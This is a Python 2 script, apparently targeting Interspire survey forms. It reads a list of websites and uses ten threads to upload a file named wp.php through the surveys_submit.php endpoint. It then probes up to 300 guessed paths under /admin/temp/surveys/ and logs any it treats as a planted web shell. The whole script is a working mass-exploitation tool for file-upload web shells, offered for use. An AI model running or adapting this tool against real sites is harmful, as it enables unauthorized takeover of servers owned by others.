import requests, re, sys, threading
from  time import sleep
from urlparse import urlparse
requests.packages.urllib3.disable_warnings()
import threading, time, random
from Queue import Queue

out = "results.txt"
# wr = open(out, "a")

header = {"User-agent":"Linux Mozilla 5/0"}

def cekshell(url, id):
	try:
		fuzz = 0
		for fuzz_num in range(300):
			fuzz = fuzz + 1
			source = requests.get(url+"/admin/temp/surveys/"+id+"/"+str(fuzz)+"/wp.php", verify=False, headers=header)
			if source.status_code:
				print("[SHELL] "+url+"/admin/temp/surveys/"+id+"/"+str(fuzz)+"/wp.php")
				wr = open(out, "a")
				wr.write(url+"/admin/temp/surveys/"+id+"/"+str(fuzz)+"/wp.php\n")
				wr.close()
	except:
		pass
	
def main(trgt):
	try:
		print "[+] "+trgt
		exploit = trgt+"surveys_submit.php?formId=6987" # form id ganti sak karepmu
		file = open("wp.php","r")
		postdata = {"widget[0][field][][value]": file}
		data = {"submit":"Submit"}
		exp = requests.post(exploit, data=data, files=postdata, verify=False)
		cekshell(trgt, "6987") # sesuaikan yg di atas form id nya
	except:
		pass
		
try:
	list = sys.argv[1]
except:
	print("python2.7 interspire.py list.txt")
	exit()
asu = open(list).read().splitlines()
jobs = Queue()
def do_stuff(q):
	while not q.empty():
		value = q.get()
		main(value)
		q.task_done()
		
for trgt in asu:
	jobs.put(trgt)

for i in range(10): # Default 10 Thread Ganti Aja Kalau Mau
	worker = threading.Thread(target=do_stuff, args=(jobs,))
	worker.start()
jobs.join()
